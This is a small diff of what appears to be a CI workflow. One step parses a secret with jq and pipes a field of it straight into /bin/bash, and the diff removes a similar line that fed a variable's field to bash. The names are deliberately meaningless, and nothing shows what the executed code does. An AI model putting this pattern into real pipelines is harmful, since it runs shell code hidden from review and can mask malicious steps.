@@ -23,7 +23,6 @@ jobs:
           x041: ${{ secrets.x041 }}
         run: |
           printf '%s' "$x041" | jq -r .zwqk44509 | /bin/bash
-          echo $l8 | jq -r .xsep4 | /bin/bash
 
       - name: Store artifact
         if: always()
